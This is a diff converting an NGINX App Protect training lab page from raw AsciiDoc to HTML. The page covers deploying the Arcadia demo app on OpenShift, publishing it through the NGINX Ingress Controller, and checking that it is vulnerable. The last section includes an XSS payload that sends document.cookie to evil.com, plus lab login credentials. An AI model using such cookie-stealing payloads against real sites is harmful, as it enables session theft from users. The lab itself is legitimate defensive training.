@@ -109,6 +109,7 @@
 <main class="article">
 <div class="toolbar" role="navigation">
 <button class="nav-toggle"></button>
+  <a href="index.html" class="home-link"></a>
 <nav class="breadcrumbs" aria-label="breadcrumbs">
   <ul>
     <li><a href="index.html">Default Title</a></li>
@@ -122,144 +123,195 @@
 <div class="sect1">
 <h2 id="_access_arcadia_app_without_nginx_app_protect_to_establish_a_baseline"><a class="anchor" href="#_access_arcadia_app_without_nginx_app_protect_to_establish_a_baseline"></a>Access Arcadia App without NGINX App Protect to establish a baseline</h2>
 <div class="sectionbody">
+
+</div>
+</div>
+<div class="sect1">
+<h2 id="_cleanup_process"><a class="anchor" href="#_cleanup_process"></a>Cleanup Process</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Upon the completion of Lab Module 1, it&#8217;s necessary to tidy up the lab
+environment. Please follow the steps mentioned below.</p>
+</div>
+<div class="paragraph">
+<p>Execute the following commands in the bash terminal:</p>
+</div>
 <div class="listingblock">
 <div class="content">
-<pre>== Cleanup Process
-
-Upon the completion of Lab Module 1, it's necessary to tidy up the lab
-environment. Please follow the steps mentioned below.
-
-Execute the following commands in the bash terminal:
-
-----
-[source,bash]
-----
-oc delete virtualserver arcadia
-oc delete -f arcadia.yml
-----
-----
-
-== Deploy the Arcadia Application into Kubernetes
-
-[NOTE]
-.Note
-====
-The Arcadia Financial application is the same application we introduced
+<pre>[source,bash]</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>oc delete virtualserver arcadia
+oc delete -f arcadia.yml</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre></pre>
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_deploy_the_arcadia_application_into_kubernetes"><a class="anchor" href="#_deploy_the_arcadia_application_into_kubernetes"></a>Deploy the Arcadia Application into Kubernetes</h2>
+<div class="sectionbody">
+<div class="admonitionblock note">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-note" title="Note"></i>
+</td>
+<td class="content">
+<div class="title">Note</div>
+<div class="paragraph">
+<p>The Arcadia Financial application is the same application we introduced
 in Module 1, but a different version with enhanced features which will
-be used for our security lab exercises.
-====
-
-Before we can access the Arcadia application, we need to deploy it into
-our Kubernetes cluster. To do this, we'll use a single manifest file
+be used for our security lab exercises.</p>
+</div>
+</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>Before we can access the Arcadia application, we need to deploy it into
+our Kubernetes cluster. To do this, we&#8217;ll use a single manifest file
 that contains the necessary resources, such as Kubernetes deployments
 for the four Docker containers and Kubernetes services for the four
-Docker containers.
-
-To get the YAML file, we'll use the following command in our terminal
-window:
-
-[source,bash]
-----
-wget https://raw.githubusercontent.com/ericzji/nginx-openshift-lab/main/docs/class1/module2/templates/arcadia-all.yaml
-----
-
-Once we have the YAML file, we can apply it to our Kubernetes cluster
-with the following command:
-
-[source,bash]
-----
-oc apply -f ./arcadia-all.yaml
-----
-
-We can check that our Arcadia application is running by using the
-following command in our terminal window:
-
-[source,bash]
-----
-oc get services
-----
-
-This will show us the services running in our Kubernetes cluster,
-including those related to the Arcadia application.
-
-== Export the NGINX Ingress Controller services
-
-Interacting with the NGINX Ingress Controller is more comfortable with
+Docker containers.</p>
+</div>
+<div class="paragraph">
+<p>To get the YAML file, we&#8217;ll use the following command in our terminal
+window:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">wget https://raw.githubusercontent.com/ericzji/nginx-openshift-lab/main/docs/class1/module2/templates/arcadia-all.yaml</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Once we have the YAML file, we can apply it to our Kubernetes cluster
+with the following command:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">oc apply -f ./arcadia-all.yaml</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>We can check that our Arcadia application is running by using the
+following command in our terminal window:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">oc get services</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>This will show us the services running in our Kubernetes cluster,
+including those related to the Arcadia application.</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_export_the_nginx_ingress_controller_services"><a class="anchor" href="#_export_the_nginx_ingress_controller_services"></a>Export the NGINX Ingress Controller services</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Interacting with the NGINX Ingress Controller is more comfortable with
 exporting the service External IPs into system variables. This allows
-for templating to take place when we expose our applications.
-
-In the terminal window, copy the below text and paste+enter:
-
-[source,bash]
-----
-export nginx_ingress=$(oc get svc my-nginx-ingress-controller --namespace=nginx-ingress | tr -s " " | cut -d' ' -f4 | grep -v "EXTERNAL-IP")
-----
-
-== Publish Arcadia app with NGINX Plus Ingress Controller
-
-Now that we have our Arcadia application deployed in our Kubernetes
+for templating to take place when we expose our applications.</p>
+</div>
+<div class="paragraph">
+<p>In the terminal window, copy the below text and paste+enter:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">export nginx_ingress=$(oc get svc my-nginx-ingress-controller --namespace=nginx-ingress | tr -s " " | cut -d' ' -f4 | grep -v "EXTERNAL-IP")</code></pre>
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_publish_arcadia_app_with_nginx_plus_ingress_controller"><a class="anchor" href="#_publish_arcadia_app_with_nginx_plus_ingress_controller"></a>Publish Arcadia app with NGINX Plus Ingress Controller</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Now that we have our Arcadia application deployed in our Kubernetes
 cluster, we need to publish it using the NGINX Plus Ingress Controller.
-We'll do this by re-creating the NGINX Ingress Controller with Basic
-HTTP using the following command in our terminal window:
-
-This command creates a VirtualServer resource for our Arcadia
+We&#8217;ll do this by re-creating the NGINX Ingress Controller with Basic
+HTTP using the following command in our terminal window:</p>
+</div>
+<div class="paragraph">
+<p>This command creates a VirtualServer resource for our Arcadia
 application, which includes the host for the NGINX Ingress Controller
 and the upstreams for the different microservices. We can now access our
 Arcadia application externally using the NGINX Ingress Controller URL,
 which can be found by running the following command in our terminal
-window:
-
-[source,bash]
-----
-echo "NGINX Ingress Controller URL: http://$nginx_ingress/"
-----
-
-Once we have the URL, we can access our Arcadia application by opening
-it in a web browser.
-
-You should be presented with the Main page, click on Login and enter the
-credentials as below.
-
-[source,]
-----
-Username: matt
-Password: ilovef5
-----
-
-When you click on Log me in, you should be presented with the Arcadia
-application that consists of four microservices:
-
-image:./pictures/image10.png[image]
-
-Congratulations!
-
-You have now successfully deployed the application in the K8s cluster and
-published it externally using the NGINX Plus Ingress controller.
-
-== Is our application protected against Layer 7 attacks?
-
-Before we can protect our Arcadia application with NGINX App Protect, we
-need to check if it's currently vulnerable to Layer 7 attacks. We can do
+window:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">echo "NGINX Ingress Controller URL: http://$nginx_ingress/"</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Once we have the URL, we can access our Arcadia application by opening
+it in a web browser.</p>
+</div>
+<div class="paragraph">
+<p>You should be presented with the Main page, click on Login and enter the
+credentials as below.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlightjs highlight"><code class="language-none hljs">Username: matt
+Password: ilovef5</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>When you click on Log me in, you should be presented with the Arcadia
+application that consists of four microservices:</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="_images/image10.png" alt="image"></span></p>
+</div>
+<div class="paragraph">
+<p>Congratulations!</p>
+</div>
+<div class="paragraph">
+<p>You have now successfully deployed the application in the K8s cluster and
+published it externally using the NGINX Plus Ingress controller.</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_is_our_application_protected_against_layer_7_attacks"><a class="anchor" href="#_is_our_application_protected_against_layer_7_attacks"></a>Is our application protected against Layer 7 attacks?</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Before we can protect our Arcadia application with NGINX App Protect, we
+need to check if it&#8217;s currently vulnerable to Layer 7 attacks. We can do
 this by executing a simple XSS attack, which is a well-known OWASP top
-10 attack.
-
-To perform the XSS attack, we can launch the Firefox browser and append
-`?a=&lt;script&gt;` to the end of the application URL. If the request is
-allowed, then our application is vulnerable to XSS attacks.
-
-image:./pictures/image11.png[image]
-
-We can further test this by appending
-`?item='&gt;&lt;script&gt;document.location='http://evil.com/steal'+document.cookie&lt;/script&gt;`
+10 attack.</p>
+</div>
+<div class="paragraph">
+<p>To perform the XSS attack, we can launch the Firefox browser and append
+<code>?a=&lt;script&gt;</code> to the end of the application URL. If the request is
+allowed, then our application is vulnerable to XSS attacks.</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="_images/image11.png" alt="image"></span></p>
+</div>
+<div class="paragraph">
+<p>We can further test this by appending
+<code>?item='&gt;&lt;script&gt;document.location='http://evil.com/steal'+document.cookie&lt;/script&gt;</code>
 to the application URL, which will attempt to steal our document cookie.
 If this request is also allowed, then a bad actor could potentially
-steal sensitive information from our application user.
-
-image:./pictures/image12.png[image]
-
-Since our application is currently vulnerable to Layer 7 attacks, we'll
-need to protect it using NGINX App Protect in the following Lab.</pre>
+steal sensitive information from our application user.</p>
 </div>
+<div class="paragraph">
+<p><span class="image"><img src="_images/image12.png" alt="image"></span></p>
+</div>
+<div class="paragraph">
+<p>Since our application is currently vulnerable to Layer 7 attacks, we&#8217;ll
+need to protect it using NGINX App Protect in the following Lab.</p>
 </div>
 </div>
 </div>
